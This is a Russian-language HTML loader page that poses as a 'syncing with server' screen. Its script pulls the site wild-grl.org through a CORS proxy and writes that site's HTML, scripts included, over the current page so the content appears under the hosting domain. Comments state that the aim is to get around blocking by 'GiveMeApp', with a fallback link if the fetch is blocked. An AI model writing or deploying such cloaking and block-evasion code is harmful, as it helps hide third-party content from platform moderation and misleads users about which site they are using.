<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Загрузка...</title>
    <style>
        body { margin: 0; padding: 20px; font-family: sans-serif; text-align: center; background: #fff; color: #333; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0969da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 40px auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loader-container">
        <div class="spinner"></div>
        <p>Синхронизация с сервером...</p>
    </div>

    <script>
        window.onload = function() {
            // Целевой сайт
            const targetUrl = 'https://wild-grl.org';
            
            // Используем альтернативный высокоскоростной CORS-прокси
            const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(targetUrl);

            fetch(proxyUrl)
                .then(response => {
                    if (!response.ok) throw new Error('Ошибка сервера');
                    return response.text(); // Читаем как чистый HTML-текст
                })
                .then(htmlContent => {
                    // Полностью заменяем страницу контентом без смены домена
                    document.open();
                    document.write(htmlContent);
                    document.close();
                })
                .catch(err => {
                    // Если GiveMeApp заблокировал даже этот запрос, выводим прямую безопасную кнопку
                    document.getElementById('loader-container').innerHTML = 
                        '<p style="font-size:16px;">Перейти в личный кабинет:</p>' +
                        '<a href="https://wild-grl.org" style="display:inline-block; padding:12px 24px; background:#0969da; color:#fff; text-decoration:none; border-radius:6px; font-weight:bold;">ОТКРЫТЬ САЙТ</a>';
                });
        };
    </script>
</body>
</html>
